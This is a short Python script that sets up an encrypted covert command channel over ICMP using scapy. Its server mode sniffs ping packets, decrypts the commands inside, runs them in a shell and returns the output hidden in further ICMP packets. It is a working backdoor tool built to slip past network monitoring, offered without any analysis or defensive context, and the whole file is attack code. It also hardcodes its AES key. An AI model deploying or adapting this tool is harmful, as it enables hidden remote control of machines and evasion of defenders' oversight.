#!/usr/bin/env python

from __future__ import print_function

from subprocess import Popen, PIPE
from scapy.all import *
from time import sleep
from Crypto.Cipher import AES
from base64 import b64encode as enc, b64decode as dec

conf.verb = 0

pad = lambda x: enc(x) + '\0' * (16 - len(enc(x))%16)
unpad = lambda x: dec(x.rstrip('\0'))

secret_key = pad('This is a secret key!')
aesobj = AES.new(secret_key)

def send_covert(lead, message, dest):
    outbound = aesobj.encrypt(pad(lead + message))
    # outbound = lead + message
    send(IP(dst=dest)/ICMP()/outbound)

def get_covert(lead):
    mesg = sniff(filter='icmp', count=1)[0]
    if Raw in mesg:
        try:
            mesg = unpad(aesobj.decrypt(mesg.load))
        except ValueError:
            return get_covert(lead)
        # mesg = mesg.load
        if mesg[:len(lead)] == lead:
            return mesg[len(lead):]
        else:
            return get_covert(lead)

def send_loop():
    while True:
        try:
            mesg = raw_input('>>$ ')
        except EOFError:
            mesg = '\n'
        send_covert('M:', mesg, 'localhost')
        if mesg in ('\n', 'end', 'exit', 'quit'):
            break
        print(get_covert('S:'))

def get_loop():
    while True:
        shell = Popen(args=['sh'], stdin=PIPE, stdout=PIPE)
        mesg = get_covert('M:')
        if mesg in ('\n', 'end', 'exit', 'quit'):
            break
        shell.stdin.write(mesg + '\n')
        shell.stdin.write('exit\n')
        val = shell.stdout.read()
        send_covert('S:', val, 'localhost')


if __name__ == '__main__':
    import sys
    if sys.argv[1] == '-c':
        send_loop()
    elif sys.argv[1] == '-s':
        get_loop()
